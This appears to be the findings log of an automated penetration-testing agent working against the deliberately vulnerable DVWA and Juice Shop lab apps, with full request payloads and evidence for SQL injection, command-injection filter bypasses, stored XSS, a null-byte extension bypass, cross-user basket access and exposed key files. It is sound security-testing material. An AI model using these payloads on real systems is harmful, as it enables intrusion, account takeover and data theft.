state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: [security=high] GET /vulnerabilities/sqli/ with no query params returns page with no visible id input form (forms list empty); page text shows 'Click here to change your ID.' linking to session-input.php, confirming id is read from PHP session server-side rather than from GET 'id' query param (which worked at low/medium). Security Level confirmed as 'high' via page footer text and /security.php status message 'Security level set to high'.

[security=high] Re-checked form after raising security to high: form unchanged, action=/vulnerabilities/exec/ method=POST fields: ip (text), Submit (submit, value=Submit). Page footer confirms Security Level: high. Blacklist at high reportedly covers '; ' (semicolon+space), '| ' (pipe+space), and '&&'; a pipe with no trailing space (e.g. 127.0.0.1|whoami) is expected to bypass filtering per benchmark spec - not yet executed, pending verification.

[security=medium] Form unchanged: txtName maxlength=10, mtxMessage maxlength=50, submit buttons btnSign ('Sign Guestbook') and btnClear ('Clear Guestbook'). Page confirms 'Security Level: medium'. Per DVWA medium source, strip_tags() is applied to mtxMessage (removes <script> tags) but txtName is NOT filtered at medium, so a canary stored via txtName or an mtxMessage payload using non-script vectors (e.g. no closing-tag evasion) may still be needed; verifier should test both fields for filter bypass given the 10/50 char constraints.

Successfully raised security level to high via POST security=high&seclev_submit=Submit&user_token=[REDACTED] token>. Confirmed via subsequent GET /security.php showing 'Security level set to high' and 'Security level is currently: high.' plus footer 'Security Level: high' on all subsequent pages.

[security=medium] Form action changed: id is now a select dropdown (values 1-5) submitted via POST (previously GET with free-text id at low). Page confirms 'Security Level: medium'. Per DVWA medium source, quotes are escaped via mysqli_real_escape_string but id is not cast to int, so numeric boolean injection (no quotes) should still work, e.g. id=1 OR 1=1 vs id=1 AND 1=2. Dropdown constrains UI but raw POST param can still be overridden.

[security=high] GET returned form action=/vulnerabilities/sqli/session-input.php method=POST fields: id (text), Submit (submit, value=Submit). This endpoint sets the 'id' value into PHP session, used out-of-band by /vulnerabilities/sqli/ which at high security no longer accepts id via GET/POST params directly. Confirmed /vulnerabilities/sqli/ GET at high security shows no id form, only a 'Click here to change your ID' link pointing to session-input.php, indicating id is now sourced from session. Query reportedly appends LIMIT 1 requiring a trailing comment payload such as 1' OR '1'='1' #.

GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6) returned 200 with basket owned by UserId 22 containing seeded product 'Apple Juice (1000ml)' id=1, BasketItem quantity=3. No ownership check observed on basket id path param; candidate for cross-user access test with acct2 against basket id 6.

findings.title: SQL Injection in DVWA SQLi page (id parameter) - low security
request_sequence: [security=low] GET http://dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit
[security=low] GET http://dvwa/vulnerabilities/sqli/?id=1'+AND+'1'='2&Submit=Submit
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 user records: (First name: admin, Surname: admin), (First name: Gordon, Surname: Brown), (First name: Hack, Surname: Me), (First name: Pablo, Surname: Picasso), (First name: Bob, Surname: Smith). FALSE payload id=1' AND '1'='2 returned zero records (page showed only 'User ID:' with no 'ID:' result blocks). This confirms the unsanitized string concatenation of the id parameter directly into the SQL WHERE clause, enabling boolean-based SQL injection.

findings.title: OS Command Injection in DVWA Command Injection page (ip parameter) - low security
request_sequence: [security=low] POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1; whoami', Submit: 'Submit'}
findings.response_evidence: [security=low] Response pre-block contained normal ping output for 127.0.0.1 followed by the chained command's output: 'www-data' appended on its own line after the ping statistics summary ('rtt min/avg/max/mdev = 0.022/0.026/0.028/0.002 ms\nwww-data'). This confirms the ip field is passed unsanitized to a shell command allowing injection via ';' command chaining, revealing the web server process identity www-data.

findings.title: Stored XSS in DVWA Guestbook (mtxMessage field) - low security
request_sequence: [security=low] POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'}
[security=low] browser_navigate (dvwa_admin session) GET http://dvwa/vulnerabilities/xss_s/
browser_eval_js('window.xss_flag')
browser_read_dom('#test_token')
findings.response_evidence: [security=low] POST succeeded (HTTP 200); raw HTML text extraction showed 'Name: tester Message:' (empty because the submitted payload is a <script> tag with no visible inline text, consistent with the payload being stored and rendered unescaped as an executable script element rather than escaped/encoded text). Loading the stored guestbook page in an authenticated browser context (dvwa_admin) executed the injected script.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result: 1. browser_read_dom("#test_token") returned inner_text/inner_html_excerpt: "window.xss_flag=1", confirming the injected <script id="test_token"> element was stored server-side and executed client-side on page load, proving Stored XSS.

findings.title: OS Command Injection via pipe bypass in 'ip' field (DVWA Command Injection, medium security)
request_sequence: GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirmed page shows 'Security Level: medium'
POST http://dvwa/vulnerabilities/exec/ with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} (session=dvwa_admin)
findings.response_evidence: [security=medium] Payload ip=127.0.0.1| whoami bypassed the medium-level blacklist (which strips ';' and '&&' but not a bare pipe). The response's 'Ping a device' output block contained the literal command output 'www-data' (web server process identity), confirmed via pre_blocks: ["www-data"] and visible_text containing '...Enter an IP address: www-data More Information...'. This proves arbitrary OS command execution through the ip parameter at medium security.

findings.title: SQL Injection via numeric boolean bypass in 'id' POST parameter (DVWA SQL Injection, medium security)
request_sequence: GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> confirmed page shows 'Security Level: medium' and id is now a <select> dropdown (1-5)
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin) -- TRUE condition, overriding the dropdown by raw POST
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin) -- FALSE condition
findings.response_evidence: [security=medium] At medium security, quotes are escaped via mysqli_real_escape_string but the id value is not cast to an integer, so numeric (quote-less) boolean injection still works despite the UI constraining input to a dropdown (raw POST body overrides it). TRUE payload id='1 OR 1=1' returned 5 seeded user records (surnames: admin, Brown, Me, Picasso, Smith) -- full table dump instead of a single row, proving injection. FALSE payload id='1 AND 1=2' returned zero records (no 'ID:' blocks in response, just the bare form). This TRUE/FALSE differential with multi-row disclosure vs empty result confirms exploitable SQL injection at medium security.

findings.title: OS Command Injection via pipe bypass (ip field) - DVWA high security
request_sequence: GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirmed Security Level: high, form fields ip, Submit
POST http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) form_data={ip: '127.0.0.1|whoami', Submit: 'Submit'}
findings.response_evidence: [security=high] Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-security blacklist of '; ', '| ', and '&&') was submitted to POST /vulnerabilities/exec/. The response page rendered the ping output block (pre_blocks) containing exactly: "www-data" immediately following the normal ping command execution, confirming the whoami command executed server-side as the web process user. Full visible_text snippet: "...Ping a device Enter an IP address: www-data More Information...". Page footer confirms Security Level: high throughout the test.

findings.title: SQL Injection via out-of-band session id input (LIMIT 1 + comment bypass) - DVWA high security
request_sequence: GET http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) -> form fields id, Submit
POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: "1' OR '1'='1' #", Submit: 'Submit'}  [TRUE condition]
GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> rendered result for TRUE condition
POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: "1' AND '1'='2' #", Submit: 'Submit'}  [FALSE condition]
GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> rendered result for FALSE condition
findings.response_evidence: [security=high] At high security the id parameter is no longer accepted directly by /vulnerabilities/sqli/ (no form present there); instead it is set out-of-band via session-input.php and consumed from the PHP session by the underlying query that appends 'LIMIT 1' with a trailing comment required to neutralize it. TRUE payload id=1' OR '1'='1' # set via session-input.php (confirmed by page echo "Session ID: 1' OR '1'='1' #"), then GET /vulnerabilities/sqli/ returned 5 full seeded records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) - i.e. multiple distinct seeded user surnames: admin, Brown, Me, Picasso, Smith. FALSE control payload id=1' AND '1'='2' # (confirmed by page echo "Session ID: 1' AND '1'='2' #"), then GET /vulnerabilities/sqli/ returned ZERO records (no ID/First name/Surname blocks present in the response, only the "Click here to change your ID" link). This TRUE-returns-multiple-rows vs FALSE-returns-zero-rows behavior confirms exploitable SQL injection at high security level.

findings.title: Authentication Bypass via SQL Injection on Login Endpoint
request_sequence: POST http://juiceshop:3000/rest/user/login  Body: {"email": "' OR 1=1--", "password": "anything"}
findings.response_evidence: HTTP 200 response body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email field ' OR 1=1-- causes the backend SQL WHERE clause to match all rows; the application returns the FIRST matching user record (umail: admin@juice-sh.op, bid:1 -- admin's basket id) along with a valid signed authentication JWT, despite supplying an arbitrary password ('anything') that does not match any real credential. This confirms a classic SQLi auth-bypass logging the attacker in as the first registered user, admin@juice-sh.op, without knowing the real password.

findings.title: SQL Injection in Product Search (Error-based + UNION-based)
request_sequence: GET http://juiceshop:3000/rest/products/search?q=qwert%27
GET http://juiceshop:3000/rest/products/search?q=x%27))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9--
findings.response_evidence: Request 1 (q=qwert'): HTTP 500, body: \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error\" -- confirms the single quote breaks out of the backend SQL string literal, causing a raw SQLite syntax error (unsanitized string concatenation into SQL query). Request 2 (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--): HTTP 200, body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} -- the literal integer values 1-9 supplied in the UNION SELECT are reflected directly as the product fields (name=2, description=3, price=4, etc.), proving attacker-controlled UNION SELECT data is successfully injected into and returned by the search query with no error, confirming full SQL injection in the 9-column products table query.

findings.title: Unauthenticated Access to User Feedback Discloses PII (Email Addresses)
request_sequence: GET http://juiceshop:3000/api/Feedbacks (no Authorization header, unauth session)
findings.response_evidence: HTTP 200 with no authentication supplied. Response body is a JSON array of 8 feedback records. Several records tied to non-null UserId values embed partial author email addresses directly in the public 'comment' field, e.g. record id=1 (UserId 1): \"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\"; id=2 (UserId 2): \"Great shop! Awesome service! (***@juice-sh.op)\"; id=3 (UserId 3): \"Nothing useful available here! (***der@juice-sh.op)\"; id=4 (UserId 21): \"...(***ereum@juice-sh.op)\". These partially-masked but still identifying email addresses are PII disclosed to a fully unauthenticated caller via a public REST endpoint, confirming unauthenticated PII exposure. (Feedback records with UserId:null are correctly shown as \"anonymous\", contrasting with the leaking authenticated-user records.)

findings.title: Cross-User Basket Access (BOLA) via /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6) -> 200, data.UserId=22, Products=[{id:1,name:'Apple Juice (1000ml)', BasketItem:{quantity:3, BasketId:6}}]

GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7, different account) -> 200, returns SAME basket id=6, UserId=22, Products=[{id:1,name:'Apple Juice (1000ml)', BasketItem:{quantity:3, BasketId:6}}]
findings.response_evidence: juiceshop_acct2 (whose own basket id is 7) was able to GET /rest/basket/6 and received HTTP 200 with the full basket belonging to UserId 22 (juiceshop_acct1), including the distinct seeded product 'Apple Juice (1000ml)' with BasketItem quantity=3 and BasketId=6 — identical to what acct1 retrieved for its own basket. No ownership/ACL check was enforced on the basket id path parameter, confirming a Broken Object Level Authorization (BOLA) vulnerability allowing any authenticated user to read another user's basket contents by ID.

findings.title: Open Directory Listing Exposes Confidential Acquisitions Memo
request_sequence: GET /ftp/ (Accept: text/html,application/json) as unauth -> 200, directory listing shows: acquisitions.md (909 bytes), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml, quarantine/
GET /ftp/acquisitions.md as unauth -> 200, content-type text/markdown, body contains confidential memo text
findings.response_evidence: Unauthenticated GET /ftp/ returned HTTP 200 with a browsable directory index (serve-index) listing acquisitions.md among other sensitive files. Direct unauthenticated GET /ftp/acquisitions.md returned HTTP 200 (text/markdown) with content: \"# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact...\" This confirms an open directory listing exposing a confidential business document to unauthenticated users (CWE-200).

findings.title: Poison Null-Byte Extension Filter Bypass on /ftp/ File Server
request_sequence: GET /ftp/package.json.bak as unauth -> 403 'Error: Only .md and .pdf files are allowed!' (fileServer.js:55 verify())
GET /ftp/package.json.bak%2500.md as unauth -> 200, content-type application/octet-stream, body is full contents of package.json (name: juice-shop, version, dependencies, etc.)
findings.response_evidence: Direct GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' and stack trace referencing fileServer.js verify() extension whitelist. Appending a URL-encoded null byte followed by an allowed extension, GET /ftp/package.json.bak%2500.md, bypassed this filter and returned HTTP 200 with the full contents of the restricted package.json.bak file (JSON body starting '{\"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", ...dependencies...}'). This confirms a poison null-byte path traversal / extension-filter bypass vulnerability (CWE-22).

findings.title: Exposed Encryption-Keys Directory Listing with Retrievable Key Files
request_sequence: GET /encryptionkeys/ Accept: text/html,application/json -> 200, directory listing
GET /encryptionkeys/jwt.pub -> 200, RSA public key content
GET /encryptionkeys/premium.key -> 200, key content
findings.response_evidence: 1) GET http://juiceshop:3000/encryptionkeys/ (unauth, Accept: text/html,application/json) returned HTTP 200 with a browsable directory listing: visible_text = \"listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM\" and hyperlinks to both files. 2) GET http://juiceshop:3000/encryptionkeys/jwt.pub returned HTTP 200 with body: \"-----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\\n-----END RSA PUBLIC KEY-----\" confirming the JWT signing public key is exposed. 3) GET http://juiceshop:3000/encryptionkeys/premium.key returned HTTP 200 with body: \"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\" confirming the premium feature unlock key is exposed. All three conditions (browsable listing + both files retrievable with sensitive content) are satisfied, confirming CWE-548 exposure of sensitive encryption/key material via an unauthenticated open directory.
